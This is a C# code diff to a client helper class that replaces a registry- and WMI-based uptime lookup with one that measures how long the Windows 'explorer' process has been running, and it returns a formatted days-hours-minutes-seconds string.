@@ -12,49 +12,25 @@ namespace Pulsar.Client.Helper
         {
             try
             {
-                // Try registry-based approach first (more reliable than WMI)
-                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management"))
+                var explorer = System.Diagnostics.Process.GetProcessesByName("explorer");
+                if (explorer.Length > 0)
                 {
-                    if (key != null)
-                    {
-                        var bootTimeValue = key.GetValue("BootTime");
-                        if (bootTimeValue is long bootTime)
-                        {
-                            // BootTime is stored as FILETIME (100-nanosecond intervals since Jan 1, 1601)
-                            var bootDateTime = DateTime.FromFileTime(bootTime);
-                            var uptimeSpan = DateTime.Now - bootDateTime;
+                    DateTime sessionStart = explorer[0].StartTime;
+                    TimeSpan uptimeSpan = DateTime.Now - sessionStart;
 
-                            return string.Format("{0}d : {1}h : {2}m : {3}s",
-                                uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
-                        }
-                    }
+                    return string.Format("{0}d : {1}h : {2}m : {3}s",
+                        uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
                 }
-
-                // Fallback to WMI if registry fails
-                string uptime = string.Empty;
-                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_OperatingSystem WHERE Primary='true'"))
+                else
                 {
-                    foreach (ManagementObject mObject in searcher.Get())
-                    {
-                        DateTime lastBootUpTime = ManagementDateTimeConverter.ToDateTime(mObject["LastBootUpTime"].ToString());
-                        TimeSpan uptimeSpan = TimeSpan.FromTicks((DateTime.Now - lastBootUpTime).Ticks);
-
-                        uptime = string.Format("{0}d : {1}h : {2}m : {3}s", uptimeSpan.Days, uptimeSpan.Hours, uptimeSpan.Minutes, uptimeSpan.Seconds);
-                        break;
-                    }
+                    return "Explorer not running";
                 }
-
-                if (string.IsNullOrEmpty(uptime))
-                    throw new Exception("Getting uptime failed");
-
-                return uptime;
             }
-            catch (Exception)
+            catch
             {
                 return string.Format("{0}d : {1}h : {2}m : {3}s", 0, 0, 0, 0);
             }
         }
-
         public static string GetPcName()
         {
             return Environment.MachineName;
